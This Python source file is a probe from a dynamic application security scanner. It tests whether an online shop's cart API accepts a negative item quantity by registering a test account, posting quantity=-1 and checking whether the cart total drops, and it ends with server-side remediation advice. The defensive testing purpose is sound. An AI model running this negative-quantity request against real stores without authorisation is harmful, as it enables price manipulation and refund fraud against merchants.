#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Business logic: cart accepts negative quantity, producing a negative
line total (effectively a refund-without-purchase).

A correctly-validated cart endpoint refuses any non-positive integer
quantity at the point of insertion. When the validation is missing
(or only present in the front-end), POSTing `{"quantity": -1}` causes
the line item to subtract money from the order total instead of
adding it. The downstream effect at checkout depends on the payment
integration: some merchants short-circuit a negative total to zero
(less harmful), others actually settle a negative invoice (refund).

This probe doesn't go to checkout — settling a negative invoice is
genuinely destructive and we have a separate `--allow-destroy`-gated
probe class for that. Here we stop at the cart-state check, which is
sufficient to demonstrate the input-validation gap.

Detection signal:
  Validated=True only when ALL of:
    1. POST add-to-cart with quantity=-1 returns 200 / 201 (server
       did not reject negative input), AND
    2. A subsequent GET of the cart shows EITHER a line item with
       negative quantity OR a total that is now LOWER than the
       baseline (after the negative-quantity insert).

Two independent signals required so a 200 + idempotent "did nothing"
response doesn't false-positive.
"""
from __future__ import annotations

import json
import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

CART_ITEM_PATHS = (
    "/api/BasketItems",
    "/api/cart/items",
    "/api/cart/add",
    "/rest/basket/add",
    "/rest/cart/add",
)
CART_VIEW_PATHS = (
    "/api/Baskets/{bid}",
    "/api/cart",
    "/rest/basket/{bid}",
    "/rest/cart",
)
PRODUCTS_PATHS = ("/api/Products", "/api/products", "/rest/products")


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"negqty-{secrets.token_hex(6)}@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "bid": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            out["bid"] = auth.get("bid") or auth.get("BasketId")
        except json.JSONDecodeError:
            pass
    return out


def _first_product_id(client: SafeClient, origin: str, token: str) -> int | None:
    for path in PRODUCTS_PATHS:
        r = client.request("GET", urljoin(origin, path),
                           headers={"Authorization": f"Bearer {token}"})
        if r.status != 200 or not r.body:
            continue
        try:
            doc = json.loads(r.text)
        except json.JSONDecodeError:
            continue
        rows = doc.get("data") if isinstance(doc, dict) else doc
        if isinstance(rows, list):
            for row in rows:
                if isinstance(row, dict) and isinstance(row.get("id"), int):
                    return row["id"]
    return None


def _read_total(text: str) -> float | None:
    """Pull a numeric total/subtotal from the cart payload. Same
    conservative approach as the coupon probe — JSON first, regex
    fallback, None means we couldn't measure (do not validate)."""
    try:
        doc = json.loads(text)
    except json.JSONDecodeError:
        doc = None
    if isinstance(doc, dict):
        for candidate in (doc, doc.get("data") if isinstance(doc.get("data"), dict) else None):
            if not isinstance(candidate, dict):
                continue
            for key in ("total", "subtotal", "totalPrice", "grandTotal",
                        "amount"):
                v = candidate.get(key)
                if isinstance(v, (int, float)):
                    return float(v)
    m = re.search(r'"(?:total|subtotal|totalPrice|grandTotal)"\s*:\s*(-?[0-9]+(?:\.[0-9]+)?)',
                  text or "")
    if m:
        return float(m.group(1))
    return None


def _has_negative_line(text: str) -> bool:
    """True when the cart body contains any line item / row whose
    `quantity` is negative. Used as the second corroborating signal."""
    try:
        doc = json.loads(text)
    except json.JSONDecodeError:
        return False
    def _walk(node) -> bool:
        if isinstance(node, dict):
            q = node.get("quantity")
            if isinstance(q, (int, float)) and q < 0:
                return True
            return any(_walk(v) for v in node.values())
        if isinstance(node, list):
            return any(_walk(v) for v in node)
        return False
    return _walk(doc)


def _fetch_cart(client: SafeClient, origin: str, token: str,
                bid: int | None) -> tuple[str, str]:
    for path in CART_VIEW_PATHS:
        url_path = path.format(bid=bid) if "{bid}" in path else path
        if "{bid}" in path and bid is None:
            continue
        r = client.request("GET", urljoin(origin, url_path),
                           headers={"Authorization": f"Bearer {token}"})
        if r.status == 200 and r.body:
            return url_path, r.text or ""
    return "", ""


class BizLogicNegativeQuantityTotalProbe(Probe):
    name = "bizlogic_negative_quantity_total"
    summary = ("Detects cart endpoints that accept negative quantity, "
               "producing a negative line total or reduced cart total.")
    safety_class = "probe"

    def add_args(self, parser):
        # No probe-specific args beyond the base set; add explicit
        # docs for clarity in `--help` output.
        pass

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=(f"Inconclusive: no probe session on {origin}; "
                         "negative-qty test skipped."),
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        bid = sess.get("bid")
        product_id = _first_product_id(client, origin, token) or 1

        # Baseline: GET cart BEFORE inserting anything to capture the
        # starting total so we can compare deltas.
        baseline_path, baseline_text = _fetch_cart(client, origin, token, bid)
        baseline_total = _read_total(baseline_text)

        # Insert one good row first so the cart isn't empty — then a
        # negative-quantity row would make the total go DOWN instead
        # of staying at zero.
        good_payload = json.dumps({"BasketId": bid, "ProductId": product_id,
                                   "quantity": 1, "productId": product_id}).encode()
        r_good = None
        good_path = ""
        for path in CART_ITEM_PATHS:
            r = client.request("POST", urljoin(origin, path), headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }, body=good_payload)
            if r.status != 404:
                r_good = r
                good_path = path
                break
        if r_good is None:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no cart-add endpoint on {origin} "
                         "(all candidates 404)."),
                evidence={"origin": origin, "tried": list(CART_ITEM_PATHS)},
            )

        _, mid_text = _fetch_cart(client, origin, token, bid)
        mid_total = _read_total(mid_text)

        # Now the test: POST quantity=-1 to the same endpoint.
        bad_payload = json.dumps({"BasketId": bid, "ProductId": product_id,
                                  "quantity": -1, "productId": product_id}).encode()
        r_bad = client.request("POST", urljoin(origin, good_path), headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=bad_payload)

        post_path, post_text = _fetch_cart(client, origin, token, bid)
        post_total = _read_total(post_text)
        post_has_neg = _has_negative_line(post_text)

        attempt = {
            "endpoint": good_path,
            "baseline_total": baseline_total,
            "mid_total": mid_total,
            "post_neg_total": post_total,
            "neg_post_status": r_bad.status,
            "neg_post_size": r_bad.size,
            "cart_view_path": post_path,
            "negative_line_observed": post_has_neg,
        }
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "attempt": attempt}

        accepted = 200 <= r_bad.status < 300
        # Total dropped after negative qty insert AND the POST was
        # accepted — that's the two-signal confirmation we want.
        total_dropped = (
            isinstance(mid_total, float)
            and isinstance(post_total, float)
            and post_total < mid_total - 0.001
        )
        # Third signal: the POST response body itself echoes back the
        # persisted negative quantity. Some stacks (Juice Shop is the
        # canonical example) write the row but the cart-view endpoint
        # does not surface the orphaned line because it's keyed off a
        # different basket id / nullable foreign key. The POST response
        # is the most direct evidence the server stored the bad value
        # without rejecting it -- parse it the same way we parse the
        # cart-view payload.
        post_response_text = (r_bad.text or "")
        post_response_has_neg = _has_negative_line(post_response_text)
        attempt["post_response_has_neg"] = post_response_has_neg
        if accepted and (post_has_neg or total_dropped or post_response_has_neg):
            if total_dropped:
                _evidence_phrase = (
                    f"Cart total dropped from {mid_total} to {post_total}")
            elif post_has_neg:
                _evidence_phrase = (
                    "Cart view now contains a negative-quantity line item")
            else:
                _evidence_phrase = (
                    "POST response body echoes the persisted "
                    "negative-quantity row")
            return Verdict(
                validated=True, confidence=0.92,
                summary=(f"Confirmed: cart endpoint {origin}{good_path} "
                         f"accepted quantity=-1 (status {r_bad.status}). "
                         f"{_evidence_phrase}."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Reject any non-positive integer at the cart input "
                    "validator (server-side, not just front-end):\n"
                    "  - Joi/Yup/Zod: `.integer().min(1)`.\n"
                    "  - DB constraint: `CHECK (quantity > 0)` so that "
                    "even a buggy controller can't write the row.\n"
                    "  - Treat any quantity > realistic-cap (e.g. 999) "
                    "the same way."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: cart on {origin}{good_path} either "
                     f"rejected quantity=-1 (status {r_bad.status}) or "
                     "did not produce a negative-line / reduced-total "
                     "outcome."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BizLogicNegativeQuantityTotalProbe().main()
